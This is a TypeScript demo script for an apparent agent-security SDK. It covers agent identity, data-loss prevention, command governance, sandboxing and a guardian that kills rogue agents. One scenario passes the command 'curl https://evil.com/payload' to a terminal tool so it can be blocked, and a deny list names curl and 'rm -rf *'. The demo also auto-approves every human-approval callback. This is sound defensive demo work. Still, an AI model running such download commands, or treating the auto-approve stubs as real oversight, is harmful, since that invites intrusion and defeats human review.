/**
 * Demo 05: Full Agent Security Posture Management (Agent-SPM)
 *
 * End-to-end integration of all security packages:
 *   - Identity & authorization (agent/tool registries, trust evaluation)
 *   - Egress control & DLP (data classification, channel enforcement)
 *   - Supply chain security (MCP scanning, provenance, command governance)
 *   - Guardian agents (anomaly detection, auto-kill)
 *   - Posture management (inventory, risk scoring, compliance)
 *   - Containment (sandbox constraints, change control)
 */

import { AgentSecurity, PolicyBundle, Event } from "@agent-security/core";
import { AgentRegistry, ToolRegistry, TrustEvaluator, identityEnforcer } from "@agent-security/identity";
import { egressEnforcer, ComplianceReporter, EgressPolicy, ToolChannelMapping } from "@agent-security/egress";
import { McpScanner, ToolProvenance, CommandGovernor, supplyChainGuard } from "@agent-security/supply-chain";
import { GuardianAgent, BLUEPRINT_FINANCE } from "@agent-security/guardian";
import { PostureInventory, RiskScorer, ComplianceMapper, SocFormatter, AuditExporter } from "@agent-security/posture";
import { SandboxManager, ChangeControl, containmentPlugin } from "@agent-security/containment";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function section(title: string) {
  console.log(`\n${"─".repeat(60)}`);
  console.log(`  ${title}`);
  console.log(`${"─".repeat(60)}`);
}

function log(msg: string) {
  console.log(`  ${msg}`);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  console.log("╔════════════════════════════════════════════════════════════╗");
  console.log("║         Agent Security Posture Management (SPM)          ║");
  console.log("║               Full Integration Demo                       ║");
  console.log("╚════════════════════════════════════════════════════════════╝");

  // ═══════════════════════════════════════════════════════════════════════════
  // Phase 1: Set up registries and inventory
  // ═══════════════════════════════════════════════════════════════════════════

  section("Phase 1: Identity & Inventory Setup");

  const agentRegistry = new AgentRegistry();
  const toolRegistry = new ToolRegistry();
  const trustEvaluator = new TrustEvaluator();
  const inventory = new PostureInventory();

  // Register agents with different trust levels and roles
  const agents = [
    {
      agent_id: "finance-bot",
      name: "Finance Bot",
      owner: "finance-team@acme.com",
      environment: "prod",
      agent_type: "workflow_agent" as const,
      trust_level: "privileged" as const,
      roles: ["finance.reader", "finance.writer"],
      capabilities: ["tool_call"],
      max_delegation_depth: 1,
    },
    {
      agent_id: "support-bot",
      name: "Customer Support Bot",
      owner: "support@acme.com",
      environment: "prod",
      agent_type: "chat_agent" as const,
      trust_level: "verified" as const,
      roles: ["support.reader", "email.sender"],
      capabilities: ["tool_call"],
    },
    {
      agent_id: "devops-bot",
      name: "DevOps Autonomous Agent",
      owner: "devops@acme.com",
      environment: "prod",
      agent_type: "autonomous_agent" as const,
      trust_level: "verified" as const,
      roles: ["infra.admin", "db.writer"],
      capabilities: ["tool_call", "code_execute"],
    },
    {
      agent_id: "rogue-bot",
      name: "Rogue Agent",
      owner: "unknown@acme.com",
      environment: "prod",
      agent_type: "autonomous_agent" as const,
      trust_level: "basic" as const,
      capabilities: ["tool_call", "code_execute", "web_browse"],
    },
  ];

  for (const agent of agents) {
    agentRegistry.register(agent);
    inventory.registerAgent(agent);
  }

  // Register tools
  const tools = [
    { tool_name: "trigger_payment", version: "1.0.0", provider: "built-in" as const, verified: true, permissions_required: ["finance.write"] },
    { tool_name: "query_customer_db", version: "2.1.0", provider: "built-in" as const, verified: true, permissions_required: ["db.read"] },
    { tool_name: "send_email", version: "1.0.0", provider: "built-in" as const, verified: true, permissions_required: ["email.send"] },
    { tool_name: "write_db", version: "1.0.0", provider: "built-in" as const, verified: true, permissions_required: ["db.write"] },
    { tool_name: "deploy_service", version: "1.0.0", provider: "built-in" as const, verified: true, permissions_required: ["infra.deploy"] },
    { tool_name: "terminal", version: "1.0.0", provider: "built-in" as const, verified: true, permissions_required: ["code.execute"] },
  ];

  for (const tool of tools) {
    toolRegistry.register(tool);
    inventory.registerTool(tool);
  }

  log(`Registered ${agentRegistry.size} agents, ${toolRegistry.size} tools`);
  log(`Inventory: ${JSON.stringify(inventory.getSummary())}`);

  // ═══════════════════════════════════════════════════════════════════════════
  // Phase 2: Configure security layers
  // ═══════════════════════════════════════════════════════════════════════════

  section("Phase 2: Security Layer Configuration");

  // --- Egress / DLP ---
  const egressPolicy: EgressPolicy = {
    rules: [
      { id: "BLOCK_PII_EMAIL", description: "No PII via email", classifications: ["PII"], channels: ["email"], action: "block" },
      { id: "BLOCK_PCI_ALL", description: "No PCI data anywhere", classifications: ["PCI"], action: "block" },
      { id: "BLOCK_SECRETS_ALL", description: "No secrets anywhere", classifications: ["SECRET"], action: "block" },
    ],
    default_action: "allow",
  };

  const toolChannelMappings: ToolChannelMapping[] = [
    { tool_name: "send_email", channel: "email", destination_field: "to" },
    { tool_name: "query_*", channel: "db_query", destination_field: "database" },
    { tool_name: "http_request", channel: "http_request", destination_field: "url" },
  ];

  const egress = egressEnforcer({
    policy: egressPolicy,
    toolChannelMappings,
    onBlocked: (event) => log(`[DLP BLOCK] ${event.agent_id}: ${event.classifications.map(c => c.classification).join(", ")} via ${event.channel}`),
  });

  // --- Supply chain ---
  const provenance = new ToolProvenance();
  const queryDbManifest = JSON.stringify({ name: "query_customer_db", version: "2.1.0", schema: {} });
  provenance.register("query_customer_db", queryDbManifest, { source: "internal", publisher: "acme-corp" });

  const commandGov = new CommandGovernor({
    rules: [
      { pattern: "npm test", action: "allow", reason: "Tests allowed" },
      { pattern: "npm install *", action: "require_approval", reason: "Installs need approval" },
      { pattern: "curl", action: "block", reason: "External curl blocked" },
      { pattern: "rm -rf *", action: "block", reason: "Destructive ops blocked" },
    ],
    default_action: "block",
  });

  const manifests = new Map<string, string>();
  manifests.set("query_customer_db", queryDbManifest);

  const supplyChain = supplyChainGuard({
    provenance,
    commandGovernor: commandGov,
    manifestProvider: (name) => manifests.get(name),
    blockUnverifiedMcp: true,
  });

  // --- Containment ---
  const sandboxManager = new SandboxManager();
  sandboxManager.registerSandbox("terminal", {
    type: "process",
    allowed_paths: ["/tmp", "/home/app"],
    network_enabled: false,
    timeout_ms: 10000,
  });
  sandboxManager.registerSandbox("deploy_service", {
    type: "container",
    network_enabled: true,
    timeout_ms: 60000,
  });

  const changeControl = new ChangeControl({
    provider: "jira",
    ticket_pattern: "^(JIRA|OPS)-\\d+$",
    validateTicket: async (ticketId) => ({
      ticket_id: ticketId,
      status: "approved",
      approved_by: "platform-lead",
      approved_at: new Date().toISOString(),
    }),
  });

  const containment = containmentPlugin({
    sandboxManager,
    changeControl,
    ticketRequiredTools: ["deploy_service"],
    onBlocked: (tool, reason) => log(`[CONTAINMENT] ${tool}: ${reason}`),
  });

  // --- Guardian ---
  const guardian = new GuardianAgent({
    ...BLUEPRINT_FINANCE,
    auto_kill_threshold: 3,
    onAnomaly: (incident) => log(`[GUARDIAN ${incident.severity.toUpperCase()}] ${incident.description}`),
    onKill: (agentId, reason) => log(`[GUARDIAN KILL] "${agentId}" terminated`),
  });

  log("Configured: Identity, Egress/DLP, Supply Chain, Containment, Guardian");

  // ═══════════════════════════════════════════════════════════════════════════
  // Phase 3: Assemble the SDK with all plugins + policies
  // ═══════════════════════════════════════════════════════════════════════════

  section("Phase 3: SDK Assembly");

  const policyBundle: PolicyBundle = {
    version: "1.0",
    generated_at: new Date().toISOString(),
    expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
    rules: [
      // Privileged agents can trigger payments
      {
        id: "PRIVILEGED_PAYMENT",
        description: "Only privileged agents trigger payments",
        match: { tool_name: "trigger_payment", environment: "prod", trust_level_min: "privileged" },
        outcome: "ALLOW",
      },
      // Deny payment for everyone else
      {
        id: "DENY_PAYMENT",
        description: "Deny payment for non-privileged",
        match: { tool_name: "trigger_payment", environment: "*" },
        outcome: "DENY",
      },
      // Autonomous agents need tickets for DB writes
      {
        id: "AUTO_DB_TICKET",
        description: "Autonomous DB writes require ticket",
        match: { tool_name: "write_db", environment: "*", agent_type: "autonomous_agent" },
        outcome: "REQUIRE_TICKET",
      },
      // Deployment requires human approval
      {
        id: "DEPLOY_HUMAN",
        description: "Deployments require human approval",
        match: { tool_name: "deploy_service", environment: "prod" },
        outcome: "REQUIRE_HUMAN",
      },
      // Default allow for registered agents
      {
        id: "DEFAULT_ALLOW",
        description: "Default allow",
        match: { tool_name: "*", environment: "*" },
        outcome: "ALLOW",
      },
    ],
    defaults: { outcome: "DENY" },
  };

  const security = new AgentSecurity({
    policyBundle,
    plugins: [
      identityEnforcer({ agentRegistry, toolRegistry, trustEvaluator, requireRegistration: true, minimumTrustLevel: "basic" }),
      egress,
      supplyChain,
      containment,
    ],
    onApprovalRequired: async (req, decision) => {
      log(`[APPROVAL] ${req.agent.agent_id} → ${req.action.tool_name} — auto-approved for demo`);
      return true;
    },
    onTicketRequired: async (req, decision) => {
      log(`[TICKET] ${req.agent.agent_id} → ${req.action.tool_name} — returning OPS-1234`);
      return "OPS-1234";
    },
    onHumanRequired: async (req, decision) => {
      log(`[HUMAN-IN-LOOP] ${req.agent.agent_id} → ${req.action.tool_name} — approved by operator`);
      return true;
    },
    onDeny: (req, decision) => {
      log(`[DENIED] ${req.agent.agent_id} → ${req.action.tool_name}: ${decision.reasons.map(r => r.message).join("; ")}`);
    },
    onAllow: (req, decision) => {
      log(`[ALLOWED] ${req.agent.agent_id} → ${req.action.tool_name}`);
    },
    onAuditEvent: (event: Event) => {
      guardian.processEvent(event);
    },
  });

  log("SDK assembled with 4 plugins, 5 policy rules, and all callbacks");

  // ═══════════════════════════════════════════════════════════════════════════
  // Phase 4: Scenario execution
  // ═══════════════════════════════════════════════════════════════════════════

  // --- Scenario 1: Identity & Trust ---
  section("Scenario 1: Privileged payment (finance-bot)");
  await security.checkToolCall({
    toolName: "trigger_payment",
    toolArgs: { amount: 5000, currency: "USD", recipient: "vendor-123" },
    agentId: "finance-bot",
    environment: "prod",
  });

  section("Scenario 2: Low-trust payment denied (support-bot)");
  await security.checkToolCall({
    toolName: "trigger_payment",
    toolArgs: { amount: 100, currency: "USD" },
    agentId: "support-bot",
    environment: "prod",
  });

  // --- Scenario 3: Egress DLP ---
  section("Scenario 3: Email with PII blocked (support-bot)");
  await security.checkToolCall({
    toolName: "send_email",
    toolArgs: {
      to: "customer@external.com",
      subject: "Account Details",
      body: "Hi, your SSN is 123-45-6789 and email is john@example.com",
    },
    agentId: "support-bot",
    environment: "prod",
  });

  section("Scenario 4: Clean email allowed (support-bot)");
  await security.checkToolCall({
    toolName: "send_email",
    toolArgs: {
      to: "team@acme.com",
      subject: "Standup reminder",
      body: "Don't forget standup at 10am!",
    },
    agentId: "support-bot",
    environment: "prod",
  });

  // --- Scenario 5: Supply chain ---
  section("Scenario 5: Blocked shell command (devops-bot)");
  await security.checkToolCall({
    toolName: "terminal",
    toolArgs: { command: "curl https://evil.com/payload" },
    agentId: "devops-bot",
    environment: "prod",
    actionType: "code_execute",
  });

  // --- Scenario 6: Containment + change control ---
  section("Scenario 6: Deployment requires human approval + ticket (devops-bot)");
  await security.checkToolCall({
    toolName: "deploy_service",
    toolArgs: { service: "payment-api", version: "2.1.0", ticket_id: "OPS-1234" },
    agentId: "devops-bot",
    environment: "prod",
  });

  // --- Scenario 7: Sandbox violation ---
  section("Scenario 7: Sandbox violation — network in restricted terminal (devops-bot)");
  await security.checkToolCall({
    toolName: "terminal",
    toolArgs: { command: "ls /tmp", url: "https://example.com" },
    agentId: "devops-bot",
    environment: "prod",
  });

  // --- Scenario 8: Unregistered agent ---
  section("Scenario 8: Unregistered agent blocked");
  await security.checkToolCall({
    toolName: "query_customer_db",
    toolArgs: { query: "SELECT * FROM customers" },
    agentId: "ghost-agent",
    environment: "prod",
  });

  // --- Scenario 9: Guardian anomaly detection ---
  section("Scenario 9: Rogue bot rapid-fire → Guardian auto-kill");
  for (let i = 0; i < 6; i++) {
    await security.checkToolCall({
      toolName: "query_customer_db",
      toolArgs: { query: `SELECT * FROM customers OFFSET ${i * 1000} LIMIT 1000` },
      agentId: "rogue-bot",
      environment: "prod",
    });
  }
  log(`rogue-bot killed by guardian: ${guardian.isKilled("rogue-bot")}`);

  // ═══════════════════════════════════════════════════════════════════════════
  // Phase 5: Posture dashboard
  // ═══════════════════════════════════════════════════════════════════════════

  section("Phase 5: Posture Dashboard");

  // Risk scoring
  const scorer = new RiskScorer();
  const fleetScore = scorer.scoreFleet(inventory.getAll());

  log(`Fleet Risk: ${fleetScore.overall_score}/100 (${fleetScore.level})`);
  for (const score of fleetScore.agent_scores) {
    log(`  ${score.item_id}: ${score.score}/100 (${score.level})`);
    for (const f of score.factors) {
      log(`    - ${f.description} (+${f.impact})`);
    }
  }

  if (fleetScore.top_risks.length > 0) {
    log("\nTop Risks:");
    for (const risk of fleetScore.top_risks) {
      log(`  ${risk.item_id}: ${risk.score} — ${risk.description}`);
    }
  }

  // Compliance
  section("Compliance: EU AI Act");
  const mapper = new ComplianceMapper();
  const euReport = mapper.generateReport("eu_ai_act", {
    hasInventory: true,
    hasAuditLog: true,
    hasRiskScoring: true,
    hasDlp: true,
    hasHumanOversight: true,
    hasSupplyChainVerification: true,
    hasGuardian: true,
    hasIdentityManagement: true,
  });

  log(`Score: ${euReport.summary.compliance_score}%`);
  log(`Met: ${euReport.summary.met}/${euReport.summary.total} | Partial: ${euReport.summary.partial}/${euReport.summary.total} | Not Met: ${euReport.summary.not_met}/${euReport.summary.total}`);
  for (const c of euReport.controls) {
    const icon = c.status === "met" ? "[+]" : c.status === "partial" ? "[~]" : "[-]";
    log(`${icon} ${c.control_id}: ${c.title} (${c.status})`);
  }

  section("Compliance: UK AI Governance");
  const ukReport = mapper.generateReport("uk_ai_governance", {
    hasInventory: true,
    hasAuditLog: true,
    hasRiskScoring: true,
    hasDlp: true,
    hasHumanOversight: true,
    hasSupplyChainVerification: true,
    hasGuardian: true,
    hasIdentityManagement: true,
  });

  log(`Score: ${ukReport.summary.compliance_score}%`);
  for (const c of ukReport.controls) {
    const icon = c.status === "met" ? "[+]" : c.status === "partial" ? "[~]" : "[-]";
    log(`${icon} ${c.control_id}: ${c.title} (${c.status})`);
  }

  // SOC / SIEM
  section("SOC Integration (CEF Format)");
  const socFormatter = new SocFormatter();
  const auditLog = security.getAuditLog();
  for (const event of auditLog.slice(0, 3)) {
    const cef = socFormatter.toCef(event);
    log(cef.raw.substring(0, 120) + "...");
  }
  log(`... ${auditLog.length} total events`);

  // Timeline
  section("Audit Timeline");
  const timeline = socFormatter.createTimeline(auditLog);
  for (const entry of timeline.slice(0, 6)) {
    log(`${entry.timestamp} | ${entry.agent_id} → ${entry.action} [${entry.outcome}]`);
  }
  if (timeline.length > 6) {
    log(`... and ${timeline.length - 6} more events`);
  }

  // Guardian incidents
  section("Guardian Security Incidents");
  for (const incident of guardian.getIncidents()) {
    log(`[${incident.severity.toUpperCase()}] ${incident.type}: ${incident.description}`);
    log(`  Action: ${incident.action_taken}`);
  }

  // Audit export
  section("Audit Export (CSV preview)");
  const exporter = new AuditExporter();
  const csv = exporter.exportCsv(auditLog);
  const csvLines = csv.split("\n");
  log(csvLines[0]); // headers
  for (const line of csvLines.slice(1, 4)) {
    log(line.substring(0, 120) + "...");
  }
  log(`... ${csvLines.length - 1} rows total`);

  // ═══════════════════════════════════════════════════════════════════════════
  // Summary
  // ═══════════════════════════════════════════════════════════════════════════

  section("Summary");
  log(`Agents registered:     ${agentRegistry.size}`);
  log(`Tools registered:      ${toolRegistry.size}`);
  log(`Audit events:          ${auditLog.length}`);
  log(`Guardian incidents:    ${guardian.getIncidents().length}`);
  log(`Fleet risk score:      ${fleetScore.overall_score}/100 (${fleetScore.level})`);
  log(`EU AI Act compliance:  ${euReport.summary.compliance_score}%`);
  log(`UK AI Gov compliance:  ${ukReport.summary.compliance_score}%`);

  console.log("\n╔════════════════════════════════════════════════════════════╗");
  console.log("║                    Demo Complete                          ║");
  console.log("╚════════════════════════════════════════════════════════════╝");
}

main().catch(console.error);
